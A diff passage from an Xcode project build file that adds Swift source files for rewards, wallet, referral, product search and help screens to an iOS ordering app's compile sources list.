+				E8D66AEF259109C90008CE51 /* RedeemOrderViewController.swift in Sources */,
 				D9D1E64E254D5A01003ACAA8 /* LedgerListViewModel.swift in Sources */,
 				D952C3AD254DBE020067C0D7 /* LedgerFilterViewController.swift in Sources */,
 				D9494E772532E150006562C6 /* FAPanel+Animations.swift in Sources */,
 				D9494E782532E150006562C6 /* UIImage+FAPanel.swift in Sources */,
+				E8D66AE3259109C90008CE51 /* RewardCartModel.swift in Sources */,
 				D978835F254BF29400615CA8 /* OrderDetailsViewController.swift in Sources */,
 				D91CF355253DBF77006E46FD /* CartModel.swift in Sources */,
+				E86CF572257CE1280011B8D3 /* ReferAndEarnViewController.swift in Sources */,
+				E8D66AED259109C90008CE51 /* RewardDetailsViewController.swift in Sources */,
 				D95404CF25318C86003C3277 /* ApiServices.swift in Sources */,
 				D9D558F72552E0E100C9AC23 /* ListAnimation.swift in Sources */,
 				D9D1E656254D75A6003ACAA8 /* InvoicePayViewController.swift in Sources */,
@@ -1225,10 +1433,13 @@
 				D94C619125548E13002B533F /* DashboardStokistDistributorVM.swift in Sources */,
 				D941C0FD254B263A0036BA7A /* String+Extention.swift in Sources */,
 				D9F74DDC2536FC5D00B3B6BC /* LeftMenuModel.swift in Sources */,
+				E8D66AE8259109C90008CE51 /* RewardProductListViewController.swift in Sources */,
 				D94C618225548D94002B533F /* DashboardMenuFacturerVC.swift in Sources */,
 				D976F3BB25306D6D00075811 /* PinModel.swift in Sources */,
 				D99C7A912556ADD800B4EBA5 /* OrderCancelViewModel.swift in Sources */,
+				E8D66AEE259109C90008CE51 /* RedeemOrderViewModel.swift in Sources */,
 				D98D019B253EDC4200926280 /* AddressListViewController.swift in Sources */,
+				E86CF588257CF0E50011B8D3 /* SearchProductViewController.swift in Sources */,
 				D9BD295D2534A34C004A0EC5 /* ProductDetailsViewModel.swift in Sources */,
 				D952C38D254DA8950067C0D7 /* AddIssueViewController.swift in Sources */,
 				D9BD293325346738004A0EC5 /* TagViewExtension.swift in Sources */,
@@ -1244,6 +1455,7 @@
 				D9494E7C2532E150006562C6 /* UIView+FAPanel.swift in Sources */,
 				D9D1E643254D594A003ACAA8 /* IssuesListViewModel.swift in Sources */,
 				D9BD294625348563004A0EC5 /* BrandlistViewModel.swift in Sources */,
+				E86CF581257CE6DE0011B8D3 /* WalletViewModel.swift in Sources */,
 				D9D558F52552E0E100C9AC23 /* ListView.swift in Sources */,
 				D9BD2950253492DA004A0EC5 /* FavoriteViewModel.swift in Sources */,
 				D9D1E651254D5A0A003ACAA8 /* LedgerListModel.swift in Sources */,
@@ -1251,6 +1463,7 @@
 				D9D558F12552E0E100C9AC23 /* GWLListPicker.swift in Sources */,
 				D952C3B4254DBE180067C0D7 /* LedgerFilterModel.swift in Sources */,
 				D921674B254B021300849132 /* OrderListViewModel.swift in Sources */,
+				E8D66AE4259109C90008CE51 /* RewardCartViewController.swift in Sources */,
 				D9494E9325330676006562C6 /* WearlistViewModel.swift in Sources */,
 				D97C2AD1252F827E00651C9D /* WellcomeViewModel.swift in Sources */,
 				D95A9C2D254493A1006A568E /* ProductDetailsVCEX.swift in Sources */,
@@ -1262,25 +1475,31 @@
 				D91CF352253DBF6B006E46FD /* CartViewModel.swift in Sources */,
 				D9D558F62552E0E100C9AC23 /* ListTable.swift in Sources */,
 				D9494E7E2532E150006562C6 /* Collection+FAPanel.swift in Sources */,
+				D97366832577F5F4004A2059 /* HelpAboutViewModel.swift in Sources */,
 				D9D1E662254D84D1003ACAA8 /* ListPicker.swift in Sources */,
 				D9D1E665254D8887003ACAA8 /* Date+Extention.swift in Sources */,
 				D98D019E253EDC4E00926280 /* AddressListViewModel.swift in Sources */,
 				D9216747254B020700849132 /* OrderListViewController.swift in Sources */,
 				D96BBE36253085300046C3A4 /* LoginViewModel.swift in Sources */,
+				E8D66AE6259109C90008CE51 /* RewardCatagoryModel.swift in Sources */,
 				D9BD293425346738004A0EC5 /* TagViewConfigurations.swift in Sources */,
 				D9EF581D253F349E00443F88 /* ProfileModel.swift in Sources */,
 				D94C618D25548E07002B533F /* DashboardStokistDistributorVC.swift in Sources */,
 				D95CC94F253EFEF500D6B4AD /* AddAddressViewModel.swift in Sources */,
 				D97C2AB7252F810000651C9D /* SceneDelegate.swift in Sources */,
+				D973667F2577F3FA004A2059 /* HelpAboutViewController.swift in Sources */,
 				D9D1E65C254D75C6003ACAA8 /* InvoicePayModel.swift in Sources */,
 				D9BD29492534856D004A0EC5 /* BrandlistModel.swift in Sources */,
 				D921674E254B021C00849132 /* OrderListModel.swift in Sources */,
+				E8835FE8257CC492005E07CF /* ImageZoomViewController.swift in Sources */,
 				D9788365254BF2AE00615CA8 /* OrderDetailsModel.swift in Sources */,
 				D9494E852532E262006562C6 /* LeftMenuViewController.swift in Sources */,
 				D976F3B825306D6000075811 /* PinViewModel.swift in Sources */,
 				D99647112530914B00441D17 /* ForgetPasswordViewModel.swift in Sources */,
 				D9D1E65F254D7AB8003ACAA8 /* DatePicker.swift in Sources */,
 				D9EF5824253F470A00443F88 /* EditProfileModel.swift in Sources */,
+				E86CF575257CE1310011B8D3 /* ReferAndEarnViewModel.swift in Sources */,
+				E8D66AEC259109C90008CE51 /* RewardDetailsModel.swift in Sources */,
 				D94C617925547CCF002B533F /* CouponsViewModel.swift in Sources */,
 				D952C3A3254DB8C10067C0D7 /* IssueDetailsModel.swift in Sources */,
 				D99C7A8D2556ADCA00B4EBA5 /* OrderCancelViewController.swift in Sources */,
@@ -1288,6 +1507,7 @@
 				D9BD293625346738004A0EC5 /* TagView.swift in Sources */,
 				D9494E802532E150006562C6 /* FAPanel+Gestures.swift in Sources */,
 				D9000C682532240E00BE869A /* DashboardViewController.swift in Sources */,
+				E8D66AE9259109C90008CE51 /* RewardProductListModel.swift in Sources */,
 				D94C617525547CBF002B533F /* CouponsViewController.swift in Sources */,
 				D9000C6C2532241900BE869A /* DashboardViewModel.swift in Sources */,
 				D91CF34E253DBF5F006E46FD /* CartViewController.swift in Sources */,
@@ -1296,16 +1516,23 @@
 				D950B8B6254D581F007CD5ED /* InvoiceListViewModel.swift in Sources */,
 				D9BD293825346738004A0EC5 /* TagViewExtenstion.swift in Sources */,
 				D9A4A39825336B6C004F22D4 /* ProductListViewModel.swift in Sources */,
+				E80C73E02591EC010066DB99 /* RewardOrderDetailsViewController.swift in Sources */,
 				D94C619425548E1E002B533F /* DashboardStokistDistributorModel.swift in Sources */,
 				D9825125254AA17C008107CF /* CheckoutModel.swift in Sources */,
 				E8CF8F5A256BD45200FBD6B4 /* SplashViewController.swift in Sources */,
+				E86CF584257CE6E70011B8D3 /* WalletModel.swift in Sources */,
 				D9EF581A253F349400443F88 /* ProfileViewModel.swift in Sources */,
+				E8D66AEB259109C90008CE51 /* RewardDetailsViewModel.swift in Sources */,
 				D952C391254DA89F0067C0D7 /* AddIssueViewModel.swift in Sources */,
 				D9000C6F2532242500BE869A /* DashboardModel.swift in Sources */,
 				D9BFB7262531E7CC0034A6B1 /* ChangePasswordViewController.swift in Sources */,
+				E86CF590257CFBD50011B8D3 /* SearchProductViewModel.swift in Sources */,
 				D97E747625342E6F00011E35 /* SortbyViewController.swift in Sources */,
 				D9D558F42552E0E100C9AC23 /* ListConfiguration.swift in Sources */,
 				D9D1E646254D5953003ACAA8 /* IssuesListModel.swift in Sources */,
+				E80C73E42591EC090066DB99 /* RewardOrderDetailsViewModel.swift in Sources */,
+				E8D66AF0259109C90008CE51 /* RedeemOrderModel.swift in Sources */,
+				E8D66AE2259109C90008CE51 /* RewardCartViewModel.swift in Sources */,
 				D96BBE392530853B0046C3A4 /* LoginModel.swift in Sources */,
 				D950B8B2254D5800007CD5ED /* InvoiceListViewController.swift in Sources */,
 				D9BD293725346738004A0EC5 /* TagListView.swift in Sources */,
@@ -1314,6 +1541,7 @@
 				D9D1E659254D75BA003ACAA8 /* InvoicePayViewModel.swift in Sources */,
 				D93F114D254346F60054DB1F /* ImagePicker.swift in Sources */,
 				D9D558F32552E0E100C9AC23 /* ListCreater.swift in Sources */,
+				E86CF578257CE1380011B8D3 /* ReferAndEarnModel.swift in Sources */,
 				D9D1E64A254D59F5003ACAA8 /* LedgerListViewController.swift in Sources */,
 				D9BD294D253492CD004A0EC5 /* FavoriteViewController.swift in Sources */,
 				D96BBE32253085250046C3A4 /* LoginViewController.swift in Sources */,
